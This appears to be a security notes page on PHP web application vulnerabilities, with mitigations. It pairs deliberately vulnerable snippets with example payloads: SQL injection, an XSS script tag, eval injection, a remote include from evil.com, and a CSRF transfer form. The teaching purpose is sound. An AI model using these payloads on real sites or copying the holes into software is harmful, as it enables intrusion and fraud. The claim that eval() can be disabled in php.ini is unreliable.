## Overview
PHP (Hypertext Preprocessor) is a popular server-side scripting language widely used for web development. It is embedded into HTML and is known for its ease of use and flexibility. However, due to its popularity and broad deployment, PHP web applications are common targets for attackers, often due to insecure coding practices.

## Features
- **Server-Side Scripting:** PHP scripts are executed on the server, generating HTML sent to the client.
- **Database Interaction:** PHP can connect to and interact with various databases, including MySQL, PostgreSQL, and SQLite.
- **Session Management:** Built-in functions for handling user sessions and authentication.
- **File Handling:** Allows reading, writing, and manipulation of files on the server.
- **Integration:** Easily integrates with HTML, JavaScript, and CSS, making it a staple in web development.

## Website
- [PHP Official Website](https://www.php.net/)

## Common Vulnerabilities in PHP Web Applications

### 1. **SQL Injection**
   - **Description:** Occurs when user input is improperly sanitized and directly incorporated into SQL queries, allowing attackers to execute arbitrary SQL commands.
   - **Exploitation:**
```php
     <?php
     $username = $_GET['username'];
     $query = "SELECT * FROM users WHERE username = '$username'";
     ?>
```
   - **Exploitation Vector:** An attacker can manipulate the `$username` parameter to inject SQL code:
```
http://example.com/login.php?username=admin' OR '1'='1
```
   - **Mitigation:** Use prepared statements with bound parameters.
```php
     <?php
     $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
     $stmt->execute([$username]);
     ?>
```

### 2. **Cross-Site Scripting (XSS)**
   - **Description:** Occurs when user input is improperly sanitized and then rendered in a web page, allowing attackers to inject malicious scripts.
   - **Exploitation:**
```php
     <?php
     echo "Hello, " . $_GET['name'];
     ?>
```
   - **Exploitation Vector:** An attacker can inject a script via the `name` parameter:
```
http://example.com/greet.php?name=<script>alert('XSS')</script>
```
   - **Mitigation:** Use `htmlspecialchars()` to escape output.
```php
     <?php
     echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
     ?>
```

### 3. **Remote Code Execution (RCE)**
   - **Description:** Occurs when user input is directly executed as code, allowing attackers to run arbitrary commands on the server.
   - **Exploitation:**
```php
     <?php
     eval($_GET['code']);
     ?>
```
   - **Exploitation Vector:** An attacker can execute arbitrary PHP code:
```
http://example.com/exec.php?code=phpinfo();
```
   - **Mitigation:** Avoid using `eval()` with user input. Use strict input validation and sanitization.

### 4. **File Inclusion**
   - **Description:** Includes local or remote files based on user input, allowing attackers to execute malicious scripts.
   - **Exploitation:**
```php
     <?php
     include($_GET['page']);
     ?>
```
   - **Exploitation Vector:** An attacker can include arbitrary files:
```
http://example.com/index.php?page=http://evil.com/malicious.php
```
   - **Mitigation:** Use `basename()` to sanitize filenames and avoid including files from user input. Disable `allow_url_include` in `php.ini`.

### 5. **File Upload Vulnerabilities**
   - **Description:** Improper handling of file uploads can lead to arbitrary file uploads, allowing attackers to upload malicious scripts.
   - **Exploitation:** Uploading a PHP file disguised as an image.
   - **Mitigation:** Validate file types using MIME type checks, restrict file extensions, and store files outside the web root.

### 6. **Cross-Site Request Forgery (CSRF)**
   - **Description:** Forces a user to execute unwanted actions on a web application in which they are authenticated.
   - **Exploitation Vector:** Sending a malicious link or form to a user:
```html
     <form action="http://example.com/transfer.php" method="POST">
         <input type="hidden" name="amount" value="1000">
         <input type="hidden" name="to_account" value="attacker_account">
         <input type="submit">
     </form>
```
   - **Mitigation:** Use CSRF tokens in forms and validate them on the server side.

## Tools for Exploiting PHP Applications
- **[[Burp Suite]]:** Used for intercepting and modifying HTTP requests, ideal for testing SQLi, XSS, and other web vulnerabilities.
- **[[Metasploit]]:** Contains modules for exploiting web applications, including PHP-based exploits.
- **[[SQLMap]]:** Automated tool for SQL injection testing and exploitation.
- **[[FoxyProxy]]:** Used in conjunction with Firefox to easily manage proxy settings while testing web applications.

## Best Practices
- **Input Validation and Sanitization:** Always validate and sanitize user inputs to prevent SQL injection, XSS, and other injection attacks.
- **Use Secure Coding Practices:** Follow secure coding guidelines such as OWASP to avoid common vulnerabilities.
- **Keep PHP and Libraries Updated:** Regularly update PHP and any libraries to mitigate known vulnerabilities.
- **Use Security Extensions:** Utilize security extensions like `Suhosin` for additional protection.
- **Configure `php.ini` Securely:** Disable dangerous functions such as `eval()`, `exec()`, `shell_exec()`, and configure proper error reporting settings.

## References
- [PHP Official Website](https://www.php.net/)
- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Security_Cheat_Sheet.html)
- [PHP Secure Coding Guidelines](https://www.php.net/manual/en/security.php)
- [Exploit-DB PHP Vulnerabilities](https://www.exploit-db.com/search?q=php&platform=php)

